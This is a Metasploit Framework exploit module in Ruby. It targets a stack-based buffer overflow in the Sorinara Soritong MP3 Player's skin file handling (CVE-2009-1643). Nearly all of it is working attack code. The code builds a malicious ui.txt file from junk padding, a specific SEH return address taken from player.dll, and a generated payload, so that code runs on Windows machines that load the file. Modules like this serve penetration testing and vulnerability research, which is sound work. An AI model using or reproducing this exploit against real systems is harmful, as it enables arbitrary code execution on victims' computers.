##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sorinara Soritong MP3 Player (UI File) Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a remote stack-based buffer-overflow vulnerability on
				Sorinara Soritong MP3 Player. The application fails to perform adequate boundary
				on skin files (ui.txt). The file needs to be copied on
				"%INSTALLATION_DIR%/Skin/Default"
			},
			'License'        => MSF_LICENSE,
			'Author'         => [
					'G4N0K', # Vulnerability Discovery
					'corelanc0d3r', # Exploit tutorial
					'Redsadic <julian.vilas[at]gmail.com>', # Metasploit module
			],
			'References'     =>
				[
					[ 'CVE', 'CVE-2009-1643' ],
					[ 'BID', '34863' ],
				],
			'Payload'        =>
				{
					'Space'    => 1200,
					'BadChars' => "\x00\x0a\x0d\x09",
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					# Tested by redsadic - 20130716 xpsp3
					[ 'Windows Universal', { 'Ret' => 0x10018de8 , 'Offset' => 584 } ], #pop, pop, ret - From player.dll
				],
			'Privileged'     => false,
			'DisclosureDate' => 'May 07 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'ui.txt']),
			], self.class)

	end

	def exploit

		total_length = 2000

		seh = generate_seh_payload(target.ret)

		sploit = rand_text_alpha_upper(target['Offset']) # junk

		sploit << seh

		# Filling data to trigger seh
		sploit << rand_text_alphanumeric(total_length - sploit.length)

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(sploit)

	end

end